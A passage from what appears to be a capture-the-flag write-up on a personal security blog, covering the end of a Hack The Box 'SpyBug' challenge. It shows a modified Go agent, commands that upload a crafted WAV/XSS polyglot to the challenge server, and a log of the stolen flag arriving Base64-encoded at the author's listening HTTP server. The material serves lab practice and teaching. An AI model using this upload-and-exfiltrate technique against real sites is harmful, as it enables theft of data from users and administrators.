<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> err </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk5">defer</span><span class="mtk1"> resp.Body.</span><span class="mtk7">Close</span><span class="mtk1">()</span>
<span class="mtk1">        }</span>
<span class="mtk1">}</span>

<span class="mtk3">// ...</span>

<span class="mtk5">func</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">        </span><span class="mtk5">const</span><span class="mtk1"> configPath string </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"spybug.conf"</span>
<span class="mtk1">        </span><span class="mtk5">const</span><span class="mtk1"> audioPath string </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"xss.wav"</span><span class="mtk1">  </span><span class="mtk3">// "rec.wav"</span>
<span class="mtk1">        apiURL </span><span class="mtk5">:=</span><span class="mtk1"> </span><span class="mtk4">"http://"</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> os.Args[</span><span class="mtk6">1</span><span class="mtk1">]</span>

<span class="mtk1">        </span><span class="mtk5">var</span><span class="mtk1"> apiConnection </span><span class="mtk7 mtki">bool</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">checkConnection</span><span class="mtk1">(apiURL)</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> apiConnection {</span>
<span class="mtk1">                </span><span class="mtk5">var</span><span class="mtk1"> configFileExists </span><span class="mtk7 mtki">bool</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">checkFile</span><span class="mtk1">(configPath)</span>

<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> configFileExists {</span>
<span class="mtk1">                        </span><span class="mtk5">var</span><span class="mtk1"> credentials []string </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">readFromConfigFile</span><span class="mtk1">(configPath)</span>
<span class="mtk1">                        </span><span class="mtk5">var</span><span class="mtk1"> credsValidated </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">checkAgent</span><span class="mtk1">(apiURL, credentials[</span><span class="mtk6">0</span><span class="mtk1">], credentials[</span><span class="mtk6">1</span><span class="mtk1">])</span>

<span class="mtk1">                        </span><span class="mtk5">if</span><span class="mtk1"> credsValidated {</span>
<span class="mtk1">                                </span><span class="mtk7">updateDetails</span><span class="mtk1">(apiURL, credentials[</span><span class="mtk6">0</span><span class="mtk1">], credentials[</span><span class="mtk6">1</span><span class="mtk1">])</span>

<span class="mtk1">                                </span><span class="mtk3">/* for range time.NewTicker(30 * time.Second).C {</span>
<span class="mtk3">                                        recordingRoutine(apiURL, credentials[0], cred</span><span class="mtk3">entials[1], audioPath)</span>  
<span class="mtk3">                                } */</span>
<span class="mtk1">                        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">                                </span><span class="mtk5">var</span><span class="mtk1"> newCredentials []string </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">registerAgent</span><span class="mtk1">(apiURL)</span>
<span class="mtk1">                                </span><span class="mtk7">writeToConfigFile</span><span class="mtk1">(configPath, newCredentials[</span><span class="mtk6">0</span><span class="mtk1">], newCredentials[</span><span class="mtk6">1</span><span class="mtk1">])</span>
<span class="mtk1">                                </span><span class="mtk7">main</span><span class="mtk1">()</span>
<span class="mtk1">                        }</span>
<span class="mtk1">                } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk5">var</span><span class="mtk1"> newCredentials []string </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">registerAgent</span><span class="mtk1">(apiURL)</span>
<span class="mtk1">                        </span><span class="mtk7">writeToConfigFile</span><span class="mtk1">(configPath, newCredentials[</span><span class="mtk6">0</span><span class="mtk1">], newCredentials[</span><span class="mtk6">1</span><span class="mtk1">])</span>
<span class="mtk1">                        </span><span class="mtk7">main</span><span class="mtk1">()</span>
<span class="mtk1">                }</span>
<span class="mtk1">        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">                time.</span><span class="mtk7">Sleep</span><span class="mtk1">(</span><span class="mtk6">30</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> time.Second)</span>
<span class="mtk1">                </span><span class="mtk7">main</span><span class="mtk1">()</span>
<span class="mtk1">        }</span>
<span class="mtk1">}</span>
</code></pre></div><p>I was setting the remote server host as first command-line argument and the UUID of the uploaded file as second argument.</p><h3 id="performing-the-attack">Performing the attack</h3><p>This is the approach:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">go</span> run <span class="mtku">spybug-agent.go</span> 134.209.180.248:32387 asdf
Connection OK
Config file exists
Creating creds
Connection OK
Config file exists
Creds OK

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">spybug.conf</span>
d219ec7d-6bb7-4670-95eb-768e40d5d399:743911a0-90b2-454f-bbdf-e780ae56eabc

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">send_file.py</span> 134.209.180.248:32387
f168f807-2b13-4406-9973-bcb2b6b699b5

<span class="code-cyan">$</span> <span class="code-dark-green">go</span> run <span class="mtku">spybug-agent.go</span> 134.209.180.248:32387 f168f807-2b13-4406-9973-bcb2b6b699b5  
Connection OK
Config file exists
Creds OK
</code></pre></div><p>After a bit of time, we receive a hit on our server:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
::ffff:127.0.0.1 - - [] code 404, message File not found
::ffff:127.0.0.1 - - [] "GET /V2VsY29tZSBiYWNrIEhUQnt3MzFyZF93NHZfcDBseWdsb3RfeHNzX3MwcmNlcnl9 HTTP/1.1" 404 -  
</code></pre></div><h2 id="flag">Flag</h2><p>We just need to decode this string from Base64 and done:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> V2VsY29tZSBiYWNrIEhUQnt3MzFyZF93NHZfcDBseWdsb3RfeHNzX3MwcmNlcnl9 | <span class="code-dark-green">base64</span> -d  
Welcome back HTB{w31rd_w4v_p0lyglot_xss_s0rcery}
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a><ul><li><a href="#file-upload-functionality">File upload functionality</a></li><li><a href="#agent-analysis">Agent analysis</a></li></ul></li><li><a href="#exploitation">Exploitation</a><ul><li><a href="#performing-the-attack">Performing the attack</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>